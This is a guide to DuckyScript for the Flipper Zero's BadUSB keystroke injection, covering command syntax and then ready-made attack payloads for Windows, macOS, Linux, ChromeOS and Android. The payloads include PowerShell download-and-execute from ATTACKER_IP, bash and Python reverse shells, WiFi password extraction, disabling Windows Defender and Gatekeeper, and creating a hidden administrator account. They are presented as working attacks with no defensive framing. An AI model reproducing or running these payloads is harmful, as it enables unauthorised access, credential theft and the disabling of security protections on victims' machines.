## DuckyScript - The Payload Language

### Basic Commands

The Flipper Zero supports DuckyScript 1.0 (Rubber Ducky compatible) with extensions:

```
REM         - Comment (ignored)
DELAY       - Pause in milliseconds (DELAY 500 = half a second)
STRING      - Type a text string
ENTER       - Press Enter
TAB         - Press Tab
ESCAPE      - Press Escape
BACKSPACE   - Press Backspace
DELETE      - Press Delete
SPACE       - Press Space
UP/DOWN/LEFT/RIGHT - Directional arrows
CAPSLOCK    - Caps Lock
PRINTSCREEN - Print Screen
SCROLLLOCK  - Scroll Lock
PAUSE       - Pause/Break
INSERT      - Insert
HOME        - Home
END         - End
PAGEUP      - Page Up
PAGEDOWN    - Page Down
F1-F12      - Function keys
```

### Modifiers (key combinations)

```
GUI         - Windows/Command key (GUI r = Win+R)
ALT         - Alt key (ALT F4 = Alt+F4)
CTRL        - Control key (CTRL c = Ctrl+C)
SHIFT       - Shift key (SHIFT TAB = Shift+Tab)
CTRL-ALT    - Ctrl+Alt combined
CTRL-SHIFT  - Ctrl+Shift combined
ALT-SHIFT   - Alt+Shift combined
GUI-SHIFT   - Win+Shift combined
```

### Advanced Commands (Flipper extensions)

```
ALTCHAR     - Insert character via Alt code (e.g. ALTCHAR 064 = @)
ALTSTRING   - Type string using Alt codes (layout independent!)
ALTCODE     - Alias of ALTCHAR
SYSRQ       - System Request / SysRq
MEDIA       - Multimedia commands
REPEAT      - Repeat the last command N times
WAIT_FOR_BUTTON_PRESS - Wait for the user to press the Flipper button
DEFAULT_DELAY - Set default delay between each command
```

### Structure of a Typical Payload

```
REM ======================================
REM Payload: Reverse Shell Windows
REM Target: Windows 10/11 with PowerShell
REM Layout: IT
REM Author: [redacted]
REM ======================================

REM Set delay for slow machines
DEFAULT_DELAY 100

REM Open PowerShell as Admin (Windows 10/11)
GUI r
DELAY 500
STRING powershell
DELAY 200
CTRL-SHIFT ENTER
DELAY 1500

REM Accept UAC (if present)
ALT y
DELAY 500

REM Execute payload
STRING IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')
ENTER
```

> **Personal note:** DEFAULT_DELAY is fundamental. Without adequate delays, the payload fails because windows don't open in time. On modern Windows 10 with SSD, 500ms after GUI r is sufficient. On older machines with HDD, 1000-2000ms are needed. I prefer to be conservative with delays - a slow but working payload is better than a fast one that fails.

---

## Payload Development per OS

### Windows

**Open PowerShell (method 1 - Run dialog):**
```
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
```

**Open PowerShell as Admin (method 2 - Search):**
```
GUI
DELAY 500
STRING powershell
DELAY 500
CTRL-SHIFT ENTER
DELAY 1500
ALT y
DELAY 500
```

**Open hidden CMD:**
```
GUI r
DELAY 500
STRING cmd /c start /min cmd
ENTER
```

**Download and execute file:**
```
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')"
ENTER
```

**Extract saved WiFi passwords:**
```
STRING powershell -c "netsh wlan show profiles | Select-String 'Profilo' | ForEach { $_.ToString().Split(':')[1].Trim() } | ForEach { netsh wlan show profile name=$_ key=clear }" > %TEMP%\wifi.txt
ENTER
```

**Disable Windows Defender (requires admin):**
```
STRING powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
ENTER
```

**Create hidden admin user:**
```
STRING net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add
ENTER
```

### macOS

**Open Terminal:**
```
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
```

**Download and execute:**
```
STRING curl -s http://IP/payload.sh | bash
ENTER
```

**Extract WiFi password (requires user password):**
```
STRING security find-generic-password -wa "SSID_NAME" 2>/dev/null
ENTER
```

**Temporarily disable Gatekeeper:**
```
STRING sudo spctl --master-disable
ENTER
```

### Linux (GNOME/KDE)

**Open GNOME terminal:**
```
CTRL-ALT t
DELAY 500
```

**Open KDE terminal:**
```
GUI
DELAY 500
STRING konsole
ENTER
DELAY 500
```

**Reverse shell with netcat:**
```
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
```

**Reverse shell with Python:**
```
STRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
ENTER
```

### ChromeOS

**Open Crosh:**
```
CTRL-ALT t
DELAY 500
```

**Developer mode (if enabled):**
```
STRING shell
ENTER
DELAY 500
```

### Android (with OTG)

**Open quick settings:**
```
GUI
DELAY 500
```

**Open browser:**
```
GUI
DELAY 300
STRING chrome
DELAY 300
ENTER
DELAY 1000
STRING http://attacker.com/payload
ENTER
```

---
